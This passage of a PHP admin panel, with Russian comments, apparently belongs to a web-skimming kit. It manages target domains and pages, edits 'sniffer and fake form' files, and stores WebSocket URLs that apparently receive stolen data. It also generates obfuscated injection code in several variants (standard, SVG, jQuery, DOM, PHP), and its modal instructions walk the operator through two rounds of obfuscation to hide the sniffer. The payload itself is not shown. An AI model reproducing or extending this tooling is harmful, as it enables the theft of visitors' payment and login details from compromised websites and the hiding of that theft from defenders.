                    <a href="logout.php" class="text-yellow-500 hover:text-white">LOGOUT</a>
                </div>
            </div>
        </nav>

        <div class="container mx-auto mt-8">
            <?php if ($message): ?>
                <div class="bg-blue-500 text-white px-4 py-3 mb-4 rounded" role="alert">
                    <p class="font-bold">Информация</p>
                    <p class="text-sm"><?php echo $message; ?></p>
                </div>
            <?php endif; ?>

            <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
                <div>
                    <div class="bg-gray-800 p-6 rounded-lg shadow-lg">
                        <h2 class="text-2xl font-bold mb-4">Manage Referrers</h2>
                        <div class="mb-4">
                            <select name="selectedReferrer" class="w-full bg-gray-700 text-white rounded-lg py-2 px-4">
                                <?php sort($referrers); foreach ($referrers as $referrer): ?>
                                    <option value="<?php echo htmlspecialchars($referrer); ?>"><?php echo htmlspecialchars($referrer); ?></option>
                                <?php endforeach; ?>
                            </select>
                        </div>
                        <div class="flex space-x-2">
                            <button onclick="showAddPopup()" class="bg-blue-500 hover:bg-blue-600 text-white rounded-lg py-2 px-4">ADD</button>
                            <button onclick="deleteReferrer()" class="bg-red-500 hover:bg-red-600 text-white rounded-lg py-2 px-4">DELETE</button>
                        </div>
                    </div>

                    <div id="addPopup" class="fixed top-0 left-0 w-full h-full bg-black bg-opacity-50 hidden items-center justify-center z-50">
                        <div class="bg-gray-800 p-6 rounded-lg shadow-lg w-1/2">
                            <h2 class="text-2xl font-bold mb-4">Add Referrer</h2>
                            <input id="newReferrer" type="text" class="w-full bg-gray-700 text-white rounded-lg py-2 px-4 mb-4" placeholder="Enter site URL">
                            <div class="flex justify-end space-x-2">
                                <button onclick="addReferrer()" class="bg-blue-500 hover:bg-blue-600 text-white rounded-lg py-2 px-4">Add</button>
                                <button onclick="closeAddPopup()" class="bg-red-500 hover:bg-red-600 text-white rounded-lg py-2 px-4">Close</button>
                            </div>
                        </div>
                    </div>

                    <div class="mt-8">
                        <div class="bg-gray-800 p-6 rounded-lg shadow-lg">
                            <h2 class="text-2xl font-bold mb-4">Manage Allowed Pages</h2>
                            <form action="inject.php" method="post">
                                <div class="mb-4">
                                    <select name="selectedDomain" class="w-full bg-gray-700 text-white rounded-lg py-2 px-4">
                                        <?php
                                        $stmt = $db->prepare("SELECT DISTINCT domain FROM allowed_pages");
                                        $stmt->execute();
                                        $result = $stmt->get_result();

                                        while ($row = $result->fetch_assoc()) {
                                            $domain = $row['domain'];
                                            $selected = ($domain == $selectedDomain) ? 'selected' : '';
                                            echo "<option value='" . htmlspecialchars($domain) . "' $selected>" . htmlspecialchars($domain) . "</option>";
                                        }
                                        ?>
                                    </select>
                                </div>
                                <button type="submit" name="editDomain" class="bg-blue-500 hover:bg-blue-600 text-white rounded-lg py-2 px-4">Edit</button>
                            </form>

                            <?php if (!empty($selectedDomain)): ?>
                                <div class="mt-4">
                                    <h3 class="text-xl font-bold mb-2">Allowed Pages for <?php echo htmlspecialchars($selectedDomain); ?></h3>
                                    <table class="w-full bg-gray-700 rounded-lg">
                                        <thead>
                                            <tr>
                                                <th class="py-2 px-4 text-left">Page</th>
                                                <th class="py-2 px-4 text-right">Action</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            <?php
                                            $stmt = $db->prepare("SELECT page FROM allowed_pages WHERE domain = ?");
                                            $stmt->bind_param("s", $selectedDomain);
                                            $stmt->execute();
                                            $result = $stmt->get_result();
                                            $pageCount = $result->num_rows;
                                            while ($row = $result->fetch_assoc()) {
                                                $page = $row['page'];
                                                echo "<tr>";
                                                echo "<td class='py-2 px-4'>" . htmlspecialchars($page) . "</td>";
                                                echo "<td class='py-2 px-4 text-right'>";
                                                if ($pageCount > 1) {
                                                    echo "<form action='inject.php' method='post' class='inline-block'>";
                                                    echo "<input type='hidden' name='domainToDeletePage' value='" . htmlspecialchars($selectedDomain) . "'>";
                                                    echo "<input type='hidden' name='pageToDelete' value='" . htmlspecialchars($page) . "'>";
                                                    echo "<button type='submit' name='deletePage' class='bg-red-500 hover:bg-red-600 text-white rounded-lg py-1 px-2'>Delete</button>";
                                                    echo "</form>";
                                                } else {
                                                    echo "<span class='text-gray-400'>Cannot delete the only allowed page</span>";
                                                }
                                                echo "</td>";
                                                echo "</tr>";
                                            }
                                            ?>
                                        </tbody>
                                    </table>
                                    <form action="inject.php" method="post" class="mt-4">
                                        <input type="hidden" name="domainToAddPage" value="<?php echo htmlspecialchars($selectedDomain); ?>">
                                        <div class="flex space-x-2">
                                            <input type="text" name="newPage" placeholder="Add new page" class="w-full bg-gray-700 text-white rounded-lg py-2 px-4">
                                            <button type="submit" name="addPage" class="bg-green-500 hover:bg-green-600 text-white rounded-lg py-2 px-4">Add</button>
                                        </div>
                                    </form>
                                </div>
                            <?php endif; ?>
                        </div>

            <!-- Добавленный блок "SNIFFER AND FORM CODE HERE" -->
<!-- Добавленный блок "SNIFFER AND FORM CODE HERE" -->
<div class="bg-gray-800 p-6 rounded-lg shadow-lg mt-8">
    <h2 class="text-2xl font-bold mb-4">FAKE FORM CODE HERE</h2>
    <form action="inject.php" method="post">
        <div class="mb-4">
            <select name="selectedFileSniffAndForm" class="w-full bg-gray-700 text-white rounded-lg py-2 px-4">
                <?php
                // Получение списка файлов с '_sniffandform'
                $filesWithSniffAndForm = [];
                foreach ($files as $file) {
                    if (strpos($file, '_sniffandform.txt') !== false) {
                        $filesWithSniffAndForm[] = $file;
                    }
                }

                // Определение выбранного файла
                $selectedFile = isset($_POST['selectedFileSniffAndForm']) ? $_POST['selectedFileSniffAndForm'] : '';

                // Вывод списка файлов в выпадающем списке
                sort($filesWithSniffAndForm);
                foreach ($filesWithSniffAndForm as $file): ?>
                    <option value="<?php echo htmlspecialchars($file); ?>" <?php echo ($file == $selectedFile) ? 'selected' : ''; ?>><?php echo htmlspecialchars($file); ?></option>
                <?php endforeach; ?>
            </select>
        </div>
        <div class="flex space-x-2">
            <button type="submit" name="editSniffAndForm" class="bg-blue-500 hover:bg-blue-600 text-white rounded-lg py-2 px-4">Edit</button>
            <button type="submit" name="deleteSniffAndForm" class="bg-red-500 hover:bg-red-600 text-white rounded-lg py-2 px-4">Delete</button>
        </div>
    </form>
</div>



<?php if ($showTextArea && isset($fileContent)): ?>
<div class="bg-gray-800 p-6 rounded-lg shadow-lg mt-4">
    <form action="inject.php" method="post">
        <div class="mb-4">
            <textarea name="fileContent" class="w-full bg-gray-700 text-white rounded-lg py-2 px-4 h-64"><?php echo htmlspecialchars($fileContent); ?></textarea>
        </div>
        <input type="hidden" name="currentFile" value="<?php echo htmlspecialchars($currentFile); ?>">
        <div>            <button type="submit" name="save" class="bg-green-500 hover:bg-green-600 text-white rounded-lg py-2 px-4">
                <i class="fas fa-save"></i> Save
            </button>
		<label class="inline-flex items-center">
        <!--<input type="checkbox" name="devtools_check" class="form-checkbox h-5 w-5 text-blue-600">
        <span class="ml-2 text-white">DevTools</span> -->
    </label>
	
	<div class="mt-2">

            <!-- <button type="submit" name="obfuscate" class="bg-blue-500 hover:bg-blue-600 text-white rounded-lg py-2 px-4">
                <i class="fas fa-lock"></i> Obfuscate Step 1
            </button> -->
			
            <button type="button" onclick="openModal('step2')" class="bg-blue-500 hover:bg-blue-600 text-white rounded-lg py-2 px-4">
                <i class="fas fa-info-circle"></i>  Obfuscate Step 1
            </button>
            <button type="button" onclick="openModal('step3')" class="bg-blue-500 hover:bg-blue-600 text-white rounded-lg py-2 px-4">
                <i class="fas fa-info-circle"></i>  Obfuscate Step 2
            </button></div>

        </div>
    </form>
</div>

<!-- Modal -->
<div id="modal" class="fixed z-10 inset-0 overflow-y-auto hidden">
    <div class="flex items-center justify-center min-h-screen">
        <div class="fixed inset-0 transition-opacity">
            <div class="absolute inset-0 bg-gray-500 opacity-75"></div>
        </div>
        <div class="bg-gray-800 rounded-lg overflow-hidden shadow-xl transform transition-all sm:max-w-4xl sm:w-full">
            <div class="bg-gray-700 px-4 py-3 flex justify-between items-center">
                <h3 class="text-lg leading-6 font-medium text-gold" id="modalTitle"></h3>
                <button type="button" class="text-gold hover:text-white focus:outline-none focus:text-white transition ease-in-out duration-150" onclick="closeModal()">
                    <svg class="h-6 w-6" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
                    </svg>
                </button>
            </div>
            <div class="bg-gray-800 px-4 pt-5 pb-4 sm:p-6 sm:pb-4">
                <div class="sm:flex sm:items-start">
                    <div class="mt-3 text-center sm:mt-0 sm:ml-4 sm:text-left">
                        <div class="mt-2">
                            <ol class="list-decimal pl-6 space-y-2 text-gold" id="modalContent"></ol>
                            <div id="modalImages" class="mt-4 space-y-4"></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    function openModal(step) {
        var modal = document.getElementById('modal');
        var modalTitle = document.getElementById('modalTitle');
        var modalContent = document.getElementById('modalContent');
        var modalImages = document.getElementById('modalImages');

        modalContent.innerHTML = '';
        modalImages.innerHTML = '';

        if (step === 'step2') {
            modalTitle.textContent = 'Step 1 Instructions';
            var instructions = [
                'Copy the  code after save wih devtools disable',
                'Go to the website <a href="https://www.obfuscator.io/" target="_blank" class="text-blue-500 hover:underline">https://www.obfuscator.io/</a>',
                'Paste the code into the field - Pic 1 ',
                'Apply the settings - Pic 2',
                'Click the "Obfuscate" button and get the obfuscated code',
                'Paste it into our admin panel and save it',
                'Proceed to step 2'
            ];
            instructions.forEach(function (instruction) {
                var li = document.createElement('li');
                li.innerHTML = instruction;
                modalContent.appendChild(li);
            });

            var image1 = document.createElement('img');
            image1.src = 'includes/pic/step2.1.png';
            image1.alt = 'Step 2 Image 1';
            image1.classList.add('max-w-full', 'mx-auto');
            modalImages.appendChild(image1);

            var image2 = document.createElement('img');
            image2.src = 'includes/pic/step2.2.png';
            image2.alt = 'Step 2 Image 2';
            image2.classList.add('max-w-full', 'mx-auto');
            modalImages.appendChild(image2);
        } else if (step === 'step3') {
            modalTitle.textContent = 'Step 2 Instructions';
            var instructions = [
                'Copy the obfuscated code after step 1',
                'Go to the website <a href="https://kimbatt.github.io/js-Z/" target="_blank" class="text-blue-500 hover:underline">https://kimbatt.github.io/js-Z/</a>',
                'Paste the code into the field "Enter your JavaScript code here:"',
                'Click the "Fuck shit up" button and get the obfuscated code',
                'Click the "Copy this" button and paste the code into our admin panel and save',
                'This concludes the steps for maximum protection'
            ];
            instructions.forEach(function (instruction) {
                var li = document.createElement('li');
                li.innerHTML = instruction;
                modalContent.appendChild(li);
            });

            var image1 = document.createElement('img');
            image1.src = 'includes/pic/step3.1.png';
            image1.alt = 'Step 3 Image 1';
            image1.classList.add('max-w-full', 'mx-auto');
            modalImages.appendChild(image1);
        }

        modal.classList.remove('hidden');
    }




    function closeModal() {
        var modal = document.getElementById('modal');
        modal.classList.add('hidden');
    }
</script>
<?php endif; ?>
                    </div>

                </div>

                <div>
                    



                   <!-- Удалите существующие блоки "Generate Code for Site Injection" и "SNIFFER CODE" -->

<!-- Вставьте этот новый блок вместо удаленных -->
<div class="bg-gray-800 p-6 rounded-lg shadow-lg mt-8" style="margin:0;">
    <h2 class="text-2xl font-bold mb-4">WebSocket URL Management and Code Generation</h2>
    
    <!-- WebSocket URL Management -->
    <div class="mb-6">
        <h3 class="text-xl font-bold mb-2">Manage WebSocket URLs</h3>
        <form method="post" class="mb-4">
            <div class="flex items-center space-x-2">
                <input type="text" name="newWebSocketUrl" placeholder="Enter new WebSocket URL" class="flex-grow bg-gray-700 text-white rounded-lg py-2 px-4">
                <button type="submit" name="addWebSocketUrl" class="bg-green-500 hover:bg-green-600 text-white rounded-lg py-2 px-4">Add URL</button>
            </div>
        </form>
        
        <div class="mb-4">
            <h4 class="text-lg font-semibold mb-2">Existing WebSocket URLs:</h4>
            <?php foreach ($webSocketUrls as $url): ?>
                <div class="flex items-center justify-between bg-gray-700 text-white rounded-lg py-2 px-4 mb-2">
                    <span><?php echo htmlspecialchars($url); ?></span>
                    <form method="post" class="inline">
                        <input type="hidden" name="deleteWebSocketUrl" value="<?php echo htmlspecialchars($url); ?>">
                        <button type="submit" class="bg-red-500 hover:bg-red-600 text-white rounded-lg py-1 px-2">Delete</button>
                    </form>
                </div>
            <?php endforeach; ?>
        </div>
    </div>

    <!-- Code Generation -->
    <div>
        <h3 class="text-xl font-bold mb-2">Generate Injection Code</h3>
        <form method="post">
            <div class="mb-4">
                <label for="selectedWebSocketUrl" class="block text-sm font-medium text-white mb-2">Select WebSocket URL:</label>
                <select name="selectedWebSocketUrl" id="selectedWebSocketUrl" class="w-full bg-gray-700 text-white rounded-lg py-2 px-4">
                    <?php foreach ($webSocketUrls as $url): ?>
                        <option value="<?php echo htmlspecialchars($url); ?>"><?php echo htmlspecialchars($url); ?></option>
                    <?php endforeach; ?>
                </select>
            </div>
            <div class="grid grid-cols-2 gap-4">
                <button type="submit" name="injectType" value="standard" class="bg-yellow-500 hover:bg-yellow-600 text-white rounded-lg py-2 px-4">STANDARD Inject</button>
                <button type="submit" name="injectType" value="svg" class="bg-blue-500 hover:bg-blue-600 text-white rounded-lg py-2 px-4">SVG Inject</button>
                <button type="submit" name="injectType" value="jquery" class="bg-green-500 hover:bg-green-600 text-white rounded-lg py-2 px-4">jQuery Inject</button>
                <button type="submit" name="injectType" value="dom" class="bg-purple-500 hover:bg-purple-600 text-white rounded-lg py-2 px-4">DOM Inject</button>
                <button type="submit" name="injectType" value="php" class="bg-red-500 hover:bg-red-600 text-white rounded-lg py-2 px-4">PHP Inject</button>
                <button type="submit" name="getSnifferCode" class="bg-indigo-500 hover:bg-indigo-600 text-white rounded-lg py-2 px-4">Get Sniffer Code</button>
            </div>
        </form>
    </div>

    <!-- Display generated code -->
<!-- Отображение сгенерированного кода -->
<?php if (isset($js_obfuscated_display) && isset($js_minimized_display)): ?>
    <div class="mt-4 bg-gray-800 p-6 rounded-lg shadow-lg">
        <h3 class="text-xl font-bold mb-2">Obfuscated Code:</h3>
        <?php echo $js_obfuscated_display; ?>
        
        <h3 class="text-xl font-bold mb-2 mt-4">Minimized & Obfuscated Code:</h3>
        <textarea id="minimizedCode" class="w-full bg-gray-700 text-white rounded-lg py-2 px-4" rows="10"><?php echo strip_tags($js_minimized_display); ?></textarea>
    </div>

    <!-- Добавляем javascript-obfuscator -->
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const code = document.getElementById('minimizedCode').value;
            
            // Настройки обфускации
            const options = {
                compact: true,
                identifierNamesGenerator: 'hexadecimal',
                stringArray: true,
                stringArrayEncoding: ['rc4'],
                stringArrayThreshold: 0.8,
                controlFlowFlattening: true,
                controlFlowFlatteningThreshold: 0.75,
                deadCodeInjection: false,
                debugProtection: false,
                disableConsoleOutput: false,
                rotateStringArray: true,
                selfDefending: false,
                shuffleStringArray: true,
                splitStrings: false,
                transformObjectKeys: false,
                unicodeEscapeSequence: false
            };

            try {
                // Обфусцируем код
                const obfuscationResult = JavaScriptObfuscator.obfuscate(code, options);
                const obfuscatedCode = obfuscationResult.getObfuscatedCode();
                
                // Выводим результат в textarea
                document.getElementById('minimizedCode').value = obfuscatedCode;
            } catch(error) {
                console.error('Ошибка обфускации:', error);
            }
        });
    </script>
<?php elseif (isset($generatedCode)): ?>
    <div class="mt-4 bg-gray-800 p-6 rounded-lg shadow-lg">
        <h3 class="text-xl font-bold mb-2">Generated Code:</h3>
        <textarea class="w-full bg-gray-700 text-white rounded-lg py-2 px-4 mt-2" rows="10" readonly><?php echo htmlspecialchars($generatedCode); ?></textarea>
    </div>
<?php endif; ?>
</div>
					
				
                </div>
            </div>
        </div>
    </div>

    <script>
        function showAddPopup() {
            document.getElementById('addPopup').style.display = 'flex';
        }

        function closeAddPopup() {
            document.getElementById('addPopup').style.display = 'none';
        }

        function addReferrer() {
            var newReferrer = document.getElementById('newReferrer').value;
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "inject.php", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                    alert(this.responseText);
                    location.reload();
                }
            };
            xhr.send("action=addReferrer&createFile=true&newReferrer=" + encodeURIComponent(newReferrer));
        }

        function deleteReferrer() {
            var selectedReferrer = document.querySelector('select[name="selectedReferrer"]').value;
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "inject.php", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                    alert(this.responseText);
                    location.reload();
                }
            };
            xhr.send("action=deleteReferrer&referrer=" + encodeURIComponent(selectedReferrer));
        }
    </script>
</body>
</html>